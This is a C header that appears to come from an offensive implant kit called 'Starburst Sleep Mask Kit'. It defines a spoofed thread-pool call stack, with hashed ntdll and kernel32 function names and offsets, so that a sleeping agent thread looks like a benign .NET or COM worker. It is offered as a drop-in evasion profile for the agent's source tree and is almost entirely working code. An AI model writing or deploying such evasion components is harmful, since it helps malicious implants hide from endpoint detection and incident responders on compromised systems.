/*
 * Starburst Sleep Mask Kit - Thread Pool 3-Frame Profile
 *
 * Mimics the idle call stack of a thread pool thread that is waiting
 * inside TpReleasePool, a common pattern seen in applications that
 * create and manage their own thread pool objects. This deeper stack
 * is typical in .NET applications, COM servers, and managed code hosts.
 *
 * Spoofed stack (as seen by a debugger, top = innermost):
 *
 *   ntdll!TpReleasePool+0x402
 *   kernel32!BaseThreadInitThunk+0x14
 *   ntdll!RtlUserThreadStart+0x21
 *
 * Where you would see this pattern:
 *   - .NET CLR host processes (dotnet.exe, w3wp.exe)
 *   - COM server processes that manage thread pool objects
 *   - Applications using TP_POOL objects directly
 *   - Long-running service processes with managed thread pools
 *
 * Usage: Copy this file to agent_code/include/evasion/spoof_profiles.h
 */

#ifndef STARBURST_EVASION_SPOOF_PROFILES_H
#define STARBURST_EVASION_SPOOF_PROFILES_H

#include <constexpr.h>
#include <stdint.h>

#define SPOOF_MAX_FRAMES 10

struct SPOOF_FRAME_DEF {
    uint32_t module_hash;
    uint32_t func_hash;
    uint32_t offset;
};

static inline void populate_spoof_frames(
    SPOOF_FRAME_DEF* frames, uint32_t* count
) {
    uint32_t i = 0;

    /*
     * Frame 0 (innermost): ntdll!TpReleasePool+0x402
     *
     * When a thread pool is being torn down or a thread is waiting for
     * pool cleanup, the stack includes TpReleasePool. The +0x402 offset
     * represents a deep wait point inside the pool release logic where
     * the thread blocks waiting for outstanding callbacks to complete.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TpReleasePool" );
    frames[i].offset      = 0x402;
    i++;

    /*
     * Frame 1: kernel32!BaseThreadInitThunk+0x14
     *
     * Standard thread dispatch function. Present in thread pool threads
     * that were created through the kernel32 thread creation path.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    /*
     * Frame 2 (outermost): ntdll!RtlUserThreadStart+0x21
     *
     * Thread entry point at the bottom of the stack.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

    *count = i;
}

#endif /* STARBURST_EVASION_SPOOF_PROFILES_H */
